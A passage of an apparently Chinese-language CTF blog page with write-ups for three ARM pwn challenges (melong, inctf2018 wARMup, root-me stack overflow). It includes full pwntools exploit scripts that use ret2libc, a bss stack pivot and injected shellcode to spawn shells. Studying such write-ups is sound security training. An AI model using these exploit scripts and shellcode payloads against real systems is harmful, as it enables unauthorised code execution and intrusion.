+<p>ROPgadget 能找到合适的 gadget ：<code>0x00011bbc : pop {r0, pc}</code> ，泄露 libc ：</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">gadget</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">got</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">plt</span><span class="p">)</span>
+</code></pre></div>
+<p>返回 main 函数无论怎么搞都返回不了。但是**发现 libc 是静态加载的，两次泄露地址都是一样的**，所以直接调用 system :</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">gadget</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="exp_3">EXP<a class="headerlink" href="#exp_3" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./melong&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;debug&quot;</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;remote_addr&quot;</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;l&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabi&quot;</span><span class="p">,</span> <span class="s2">&quot;./melong&quot;</span><span class="p">])</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-g&quot;</span><span class="p">,</span> <span class="s2">&quot;1234&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabi&quot;</span><span class="p">,</span> <span class="s2">&quot;./melong&quot;</span><span class="p">])</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./melong&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="c1">#libc_base = 0xff6b6f98 - libc.symbols[&#39;puts&#39;]</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0xff6bb770</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">bin_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
+
+<span class="c1">#payload  = &#39;A&#39; * 0x54 + p32(0x00011bbc) + p32(elf.got[&#39;puts&#39;]) + p32(elf.plt[&#39;puts&#39;])#+p32(elf.sym[&#39;main&#39;])*2</span>
+<span class="n">payload</span>  <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x54</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00011bbc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Type the number:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your height(meters) : &#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your weight(kilograms) : &#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Type the number:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;How long do you want to take personal training?&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;-1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Type the number:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Type the number:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;6&#39;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="inctf2018_warmup">inctf2018_wARMup<a class="headerlink" href="#inctf2018_warmup" title="Permanent link">&para;</a></h2>
+<h3 id="_27">基本情况<a class="headerlink" href="#_27" title="Permanent link">&para;</a></h3>
+<p>32 位动态链接 arm 程序只打开了 nx 保护，存在 0x10 字节溢出。</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">104</span><span class="p">];</span> <span class="c1">// [sp+4h] [bp-68h] BYREF</span>
+
+  <span class="n">setvbuf</span><span class="p">((</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Welcome to bi0s CTF!&quot;</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">120u</span><span class="p">);</span>         <span class="c1">// 溢出0x10</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>长度是足够完成 ret2libc 操作，但是没有控制 r0 的 gadget ：</p>
+<p><img alt="image-20210123162353020" src="../_images/arm/image-20210123162353020.png" /></p>
+<p>这里思路是利用现有 gadget 控制 r3 为 bss 段上地址,利用 main 函数本身汇编代码调用 read 将 shellcode 写入到 bss 上。</p>
+<p><img alt="image-20210123162740601" src="../_images/arm/image-20210123162740601.png" /></p>
+<p>构造写入 payload 问题不大：</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">104</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_r3_pc</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main_read</span><span class="p">)</span>
+</code></pre></div>
+<p>问题是在再次控制程序流到 bss 上，执行 shellocde 。这里通过调试发现 armeabi（32位arm）出栈时使用的汇编 <code>pop    {fp, pc}</code> （fp和r11是同一个寄存器）给 pc 赋值。这句汇编是**将 fp 指向地址的值赋给 pc** ，而这个 fp 类似于 ebp ，pc 等于 eip 。</p>
+<p><img alt="image-20210123171408650" src="../_images/arm/image-20210123171408650.png" /><img alt="image-20210123171453220" src="../_images/arm/image-20210123171453220.png" /></p>
+<blockquote>
+<p>这里截图使用下面的 payload ，也就是 r11 的值是 bss+0x100</p>
+</blockquote>
+<p>如果我们用上面这个 payload 去打，当利用 main 函数内汇编调用完 read 后会继续运行到 main 结尾，也就是会再次调用 mian 结尾的出栈流程。由于之前 fp 被赋值为 <code>aaaa</code> ，所以程序会 <code>pop [fp,pc}</code> 处报错，因为 0x61616161 不存在。</p>
+<p><img alt="image-20210123171145355" src="../_images/arm/image-20210123171145355.png" /></p>
+<p>我们就利用这一点将 fp 覆盖为 bss 段，实现调用：</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">100</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_r4_pc</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main_read</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="exp_4">EXP<a class="headerlink" href="#exp_4" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>迁移完，要Shellcode 前面加个地址跳转</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./wARMup&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;debug&quot;</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;remote_addr&quot;</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;l&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabihf&quot;</span><span class="p">,</span> <span class="s2">&quot;./wARMup&quot;</span><span class="p">])</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-g&quot;</span><span class="p">,</span> <span class="s2">&quot;1234&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabihf&quot;</span><span class="p">,</span> <span class="s2">&quot;./wARMup&quot;</span><span class="p">])</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./wARMup&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/usr/arm-linux-gnueabihf/lib/libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="mi">100</span><span class="c1">#104</span>
+<span class="n">pop_r3_pc</span> <span class="o">=</span> <span class="mh">0x00010364</span>
+<span class="n">main_read</span> <span class="o">=</span> <span class="mh">0x00010530</span>
+
+<span class="c1"># payload = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span><span class="o">*</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_r3_pc</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main_read</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span><span class="o">+</span><span class="n">shellcode</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="root_me_stack_buffer_overflow_basic">root_me_stack_buffer_overflow_basic<a class="headerlink" href="#root_me_stack_buffer_overflow_basic" title="Permanent link">&para;</a></h2>
+<h3 id="_28">基本情况<a class="headerlink" href="#_28" title="Permanent link">&para;</a></h3>
+<p>32 位动态链接 arm 程序，存在 scanf 函数溢出，程序自身泄露栈地址。</p>
+<p>程序功能是可以重复向局部变量上写入，由于输入函数采用 scanf 长度被我们所控制。</p>
+<p>思路是先获取程序泄露的栈地址，然后写入 shellcode 控制 pc 跳转执行。这里用 cycli 测出来的 padding 是 0x50 ，实际调试发现需要填充 0x54 ，0x50-0x54 被填充在 r11 (fp) 。</p>
+<h3 id="exp_5">EXP<a class="headerlink" href="#exp_5" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./root_me_stack_buffer_overflow_basic&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;debug&quot;</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;remote_addr&quot;</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;l&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabihf&quot;</span><span class="p">,</span> <span class="s2">&quot;./root_me_stack_buffer_overflow_basic&quot;</span><span class="p">])</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-g&quot;</span><span class="p">,</span> <span class="s2">&quot;1234&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabihf&quot;</span><span class="p">,</span> <span class="s2">&quot;./root_me_stack_buffer_overflow_basic&quot;</span><span class="p">])</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./root_me_stack_buffer_overflow_basic&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/usr/arm-linux-gnueabihf/lib/libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;skye&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">)</span>
+<span class="n">stack_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;stack_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xA0</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">)</span>
+<span class="c1">#payload = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="_29"><a class="headerlink" href="#_29" title="Permanent link">&para;</a></h2>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+        
+          <a href="../../IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  下一页
+                </span>
+                libc2.24下IO_FILE的利用
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            <span>&copy; 2021</span>by <a href="https://www.mrskye.cn/" target="_blank">SkYe231</a> &nbsp;|&nbsp; <span><a href="http://beian.miit.gov.cn/" target="_blank">粤ICP备20056619号</a></span>
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/vendor.93c04032.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../../..",
+          features: ['tabs', 'instant'],
+          search: Object.assign({
+            worker: "../../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
